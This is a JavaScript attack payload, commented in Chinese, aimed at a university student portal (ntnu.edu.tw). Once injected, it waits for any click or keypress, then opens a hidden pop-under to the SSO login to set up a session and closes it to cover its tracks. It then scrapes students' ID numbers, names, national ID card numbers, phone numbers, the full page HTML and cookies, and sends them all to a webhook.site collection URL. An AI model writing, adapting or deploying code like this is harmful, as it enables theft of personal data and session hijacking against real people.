(async () => {
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // SSO 入口 (觸發登入用)
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    
    // 【關鍵修正】目標改為「資料頁面」，而非登入檢查點
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI"; 

    // 定義攻擊函數：只有在使用者點擊時才執行 (繞過攔截器)
    async function launchAttack() {
        // 1. 移除監聽器，確保只跑一次
        document.removeEventListener('click', launchAttack);
        document.removeEventListener('keydown', launchAttack);
        
        try {
            // 2. 在點擊事件內觸發彈窗 (Edge/Chrome 會放行)
            // 使用 Pop-under 技巧 (縮小 + 移開 + 失去焦點)
            const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
            
            if (popup) {
                // 嘗試讓彈窗躲到後面去
                try { popup.blur(); window.focus(); } catch(e) {}
                fetch(webhook + "?step=Popup_Launched_Success");
            } else {
                fetch(webhook + "?error=Popup_Still_Blocked");
                return;
            }

            // 3. 等待 SSO 完成 (給它 6 秒讓彈窗跑完流程並建立 Session)
            await new Promise(r => setTimeout(r, 6000));

            // 4. 關閉彈窗 (毀屍滅跡)
            try { popup.close(); } catch(e) {}

            // 5. 收割完整資料 (使用已建立的 Session)
            const response = await fetch(targetUrl);
            const fullHtml = await response.text();

            // 6. 提取關鍵個資 (方便預覽)
            let info = {};
            try {
                info.studentId = fullHtml.match(/學生學號:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
                info.name = fullHtml.match(/學生姓名:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
                info.idCard = fullHtml.match(/身分證字號:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
                info.phone = fullHtml.match(/手機:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
            } catch(e) {}

            // 7. 發送結果
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    msg: "PII_DATA_SECURED",
                    trigger: "User_Click",
                    victim_summary: info,
                    // 完整 HTML 源碼 (包含所有詳細資料)
                    full_html_source: fullHtml,
                    cookies: document.cookie
                })
            });

        } catch (e) {
            fetch(webhook + "?error=" + encodeURIComponent(e.message));
        }
    }

    // === 佈署陷阱 ===
    // 監聽全域點擊事件，只要受害者點任何地方就會觸發
    document.addEventListener('click', launchAttack);
    document.addEventListener('keydown', launchAttack);

    // 通知你陷阱已就緒
    fetch(webhook + "?status=Trap_Ready_Targeting_Data_Page");

})();